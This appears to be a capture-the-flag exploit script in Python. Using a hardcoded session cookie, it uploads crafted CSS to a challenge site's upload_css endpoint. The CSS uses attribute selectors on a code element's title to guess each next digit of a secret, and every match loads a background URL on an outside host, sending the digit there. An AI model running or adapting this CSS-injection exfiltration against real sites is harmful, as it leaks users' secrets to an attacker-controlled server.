import requests

sess=requests.Session()
sess.cookies['connect.sid']='s%3AC9oXUhTI7NCtqGzaMC-rGqdkMfvX9mCA.KrqoXdIEqoJ4z2R2iYcBqP0kX84GHL6NolyWLpVMIdg'
sess.post('https://ugly-website.web.jctf.pro/upload_css', files={
	'file': """
%s
""" % "\n".join('code[title^="81044092{0}"] {{background: url(https://0e1.kr/?{0})}}'.format(i) for i in '0123456789')
	})